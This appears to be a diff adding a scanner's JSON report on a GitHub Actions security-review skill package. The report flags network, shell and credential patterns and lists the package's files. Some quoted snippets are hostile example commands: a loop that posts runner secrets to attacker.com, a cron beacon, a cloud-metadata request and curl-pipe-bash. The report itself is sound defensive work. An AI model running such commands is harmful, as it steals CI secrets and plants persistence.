+        "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 264,
+        "evidence": "bash",
+        "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 271,
+        "evidence": "curl",
+        "context": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 271,
+        "evidence": "bash",
+        "context": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 283,
+        "evidence": "credential",
+        "context": "- Pwn request → awesome-go or trivy (depending on credential scope)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 287,
+        "evidence": "Credential",
+        "context": "- Credential theft → trivy (worst-case scenario)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 295,
+        "evidence": "https://",
+        "context": "- [StepSecurity: HackerBot Claw — GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 296,
+        "evidence": "https://",
+        "context": "- [Aqua Security: Trivy incident response](https://www.aquasec.com/blog/trivy-github-repository-compromised/)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "package-install",
+        "line": 23,
+        "evidence": "npm install",
+        "context": "      - run: npm install && npm test",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 28,
+        "evidence": "Credential",
+        "context": "#### Credential Persistence",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 30,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 34,
+        "evidence": "curl",
+        "context": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 34,
+        "evidence": "https://",
+        "context": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "filesystem-write",
+        "line": 37,
+        "evidence": "mkdir",
+        "context": "mkdir -p ~/.ssh",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 48,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 50,
+        "evidence": "bash",
+        "context": "nohup bash -c 'while true; do",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 52,
+        "evidence": "curl",
+        "context": "    curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 52,
+        "evidence": "https://",
+        "context": "    curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 62,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 68,
+        "evidence": "curl",
+        "context": "curl http://internal-api.corp.example.com/admin",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 68,
+        "evidence": "http://",
+        "context": "curl http://internal-api.corp.example.com/admin",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 70,
+        "evidence": "curl",
+        "context": "curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 70,
+        "evidence": "http://",
+        "context": "curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "package-install",
+        "line": 100,
+        "evidence": "npm install",
+        "context": "  - run: npm install  # Fork's package.json may install malicious deps",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 157,
+        "evidence": "sh",
+        "context": "  - run: ./deploy.sh dist/  # Deploying fork's build output!",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 170,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 247,
+        "evidence": "sh",
+        "context": "          ./deploy.sh dist/",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 266,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security)",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 267,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Caching dependencies](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "network-access",
+        "line": 268,
+        "evidence": "https://",
+        "context": "- [Cycode: GitHub Actions Cache Poisoning](https://cycode.com/blog/github-actions-cache-poisoning/)",
+        "file": "references/runner-infrastructure.md"
+      },
+      {
+        "type": "filesystem-write",
+        "line": 37,
+        "evidence": "delete",
+        "context": "Tags are **mutable Git references**. The maintainer (or attacker with write access) can delete and recreate a tag pointing to a different commit. When the tag is updated, every workflow using that tag runs the new code.",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 88,
+        "evidence": "curl",
+        "context": "### Actions That curl | bash at Runtime",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 88,
+        "evidence": "bash",
+        "context": "### Actions That curl | bash at Runtime",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 97,
+        "evidence": "curl",
+        "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 97,
+        "evidence": "https://",
+        "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 97,
+        "evidence": "sh",
+        "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 97,
+        "evidence": "bash",
+        "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 98,
+        "evidence": "bash",
+        "context": "      shell: bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 107,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 199,
+        "evidence": "secret",
+        "context": "| Unpinned third-party action from known org in sensitive/privileged workflow | **High** | Tag mutation risk with secret exposure |",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 200,
+        "evidence": "secret",
+        "context": "| Unpinned third-party action with limited privilege but real write/secret surface | **Medium** | Real supply-chain risk, bounded blast radius |",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 210,
+        "evidence": "curl",
+        "context": "ATTACK: Supply Chain via [unpinned third-party action / tag mutation / curl|bash]",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 210,
+        "evidence": "bash",
+        "context": "ATTACK: Supply Chain via [unpinned third-party action / tag mutation / curl|bash]",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 215,
+        "evidence": "secret",
+        "context": "IMPACT: [RCE with workflow permissions, secret theft, etc.]",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 222,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Security hardening — Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "network-access",
+        "line": 223,
+        "evidence": "https://",
+        "context": "- [GitHub Blog: Four tips to keep your GitHub Actions workflows secure](https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/)",
+        "file": "references/supply-chain.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 3,
+        "evidence": "credential",
+        "context": "description: 'GitHub Actions security review for workflow exploitation vulnerabilities. Use when asked to \"review GitHub Actions\", \"audit workflows\", \"check CI security\", \"GHA security\", \"workflow security review\", or review .github/workflo",
+        "file": "SKILL.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 4,
+        "evidence": "Bash",
+        "context": "allowed-tools: Read Grep Glob Bash Task",
+        "file": "SKILL.md"
+      },
+      {
+        "type": "network-access",
+        "line": 9,
+        "evidence": "https://",
+        "context": "by StepSecurity (2025): https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation",
+        "file": "SKILL.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 75,
+        "evidence": "credential",
+        "context": "| PATs / deploy keys / elevated credentials | `references/credential-escalation.md` |",
+        "file": "SKILL.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 107,
+        "evidence": "Credential",
+        "context": "### Check 4: Credential Escalation",
+        "file": "SKILL.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 110,
+        "evidence": "secret",
+        "context": "- What's the blast radius of each secret?",
+        "file": "SKILL.md"
+      }
+    ],
+    "total_bytes": 87057
+  },
+  "materialized_files": [
+    {
+      "path": "LICENSE.txt",
+      "sha256": "96e78a9ce85795b117c8929887bdb78f88bf23f7b85a31f0872cde4dff7e92cd",
+      "bytes": 10785,
+      "mode": "100644",
+      "attached": true,
+      "source_path": "LICENSE"
+    },
+    {
+      "path": "references/ai-prompt-injection-via-ci.md",
+      "sha256": "9177d24968ac5b8d719b9f6748f91751d5e157ae0afa4d41cd0bb760356f23a2",
+      "bytes": 5452,
+      "mode": "100644"
+    },
+    {
+      "path": "references/comment-triggered-commands.md",
+      "sha256": "243526302999b7cbcbff4bbdd01c7d16377b1c60a86ee8877326c2b2b040a0b3",
+      "bytes": 5608,
+      "mode": "100644"
+    },
+    {
+      "path": "references/credential-escalation.md",
+      "sha256": "7febad6c0e4073dabfb338ee4646c2dd484251ad7d18b500ea83ad6fd9ac1a1d",
+      "bytes": 6659,
+      "mode": "100644"
+    },
+    {
+      "path": "references/expression-injection.md",
+      "sha256": "f701049355e4758207f77efc53c8e4a42f377eaa15240a2c867446154041d4f0",
+      "bytes": 8644,
+      "mode": "100644"
+    },
+    {
+      "path": "references/permissions-and-secrets.md",
+      "sha256": "6b6837c5f37ff85cf18c1f611f882202ce0ce41cb006b55dd49c4da52f976779",
+      "bytes": 7917,
+      "mode": "100644"
+    },
+    {
+      "path": "references/pwn-request.md",
+      "sha256": "6dd84c91ce77d57883059edf95c2f1c64ea1ec39551c5c8208e0cadb9c3ca673",
+      "bytes": 5902,
+      "mode": "100644"
+    },
+    {
+      "path": "references/real-world-attacks.md",
+      "sha256": "761260977a220264a1ee30e0b961618495723c2e6cc4e91893b7d9d4a9408718",
+      "bytes": 9468,
+      "mode": "100644"
+    },
+    {
+      "path": "references/runner-infrastructure.md",
+      "sha256": "cb427fa29c34c10aef18766441e0be8e0123632bb87c307bdb8d1c40b47fc81e",
+      "bytes": 8040,
+      "mode": "100644"
+    },
+    {
+      "path": "references/supply-chain.md",
+      "sha256": "1f80df872a1be8f70ccf1be0bb25b2e24ee1ec2ac6a9f3d7a53800cb361bfa86",
+      "bytes": 9616,
+      "mode": "100644"
+    },
+    {
+      "path": "SKILL.md",
+      "sha256": "b75c6c43ff99c82b3cf44519bd30723917de97064f225e392ecfd6fdcd7455bd",
+      "bytes": 8966,
+      "mode": "100644"
+    }
+  ],
+  "total_bytes": 87057
+}
